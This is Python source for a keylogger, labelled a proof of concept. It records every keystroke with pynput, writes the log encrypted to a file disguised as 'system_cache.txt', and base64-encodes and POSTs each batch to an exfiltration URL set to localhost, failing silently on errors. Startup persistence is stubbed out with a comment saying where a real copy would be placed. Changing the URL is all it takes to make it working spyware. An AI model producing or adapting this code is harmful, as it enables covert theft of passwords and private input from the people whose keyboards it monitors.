import os
import time
import threading
import requests
import base64
from pynput import keyboard
from cryptography.fernet import Fernet

# --- CONFIGURATION ---
LOG_FILE = "system_cache.txt" # Disguised filename
EXFIL_URL = "http://127.0.0.1:8080"
BUFFER_SIZE = 20 # Keystrokes before exfiltration

class SecureKeylogger:
    def __init__(self):
        self.log_buffer = ""
        self.encryption_key = Fernet.generate_key()
        self.cipher = Fernet(self.encryption_key)
        self.is_running = True

        # Save key locally for PoC demonstration purposes
        with open("decryption_key.key", "wb") as f:
            f.write(self.encryption_key)

    def simulate_persistence(self):
        # Simulated Startup Persistence
        # In a real scenario, this would copy the .exe to %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
        print("[*] Simulated: Registry/Startup persistence hook injected.")

    def on_press(self, key):
        if not self.is_running:
            return False

        try:
            self.log_buffer += key.char
        except AttributeError:
            if key == key.space:
                self.log_buffer += " "
            elif key == key.enter:
                self.log_buffer += "\n"
            elif key == key.esc:
                print("\n[!] KILL SWITCH ACTIVATED. Shutting down keylogger...")
                self.is_running = False
                return False
            else:
                self.log_buffer += f"[{key.name}]"

        if len(self.log_buffer) >= BUFFER_SIZE:
            self.process_and_exfiltrate()

    def process_and_exfiltrate(self):
        if not self.log_buffer:
            return

        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
        raw_data = f"[{timestamp}] {self.log_buffer}"
        
        # 1. Encrypt the data
        encrypted_data = self.cipher.encrypt(raw_data.encode('utf-8'))
        
        # 2. Store Locally
        with open(LOG_FILE, "ab") as f:
            f.write(encrypted_data + b"\n")
            
        # 3. Encode & Exfiltrate
        encoded_payload = base64.b64encode(encrypted_data).decode('utf-8')
        try:
            requests.post(EXFIL_URL, data=encoded_payload, timeout=3)
        except requests.exceptions.RequestException:
            pass # Fail silently if server is unreachable

        self.log_buffer = "" # Clear buffer

    def start(self):
        self.simulate_persistence()
        print("[*] Keylogger started. Type anywhere. Press ESC to kill.")
        with keyboard.Listener(on_press=self.on_press) as listener:
            listener.join()

if __name__ == "__main__":
    poc = SecureKeylogger()
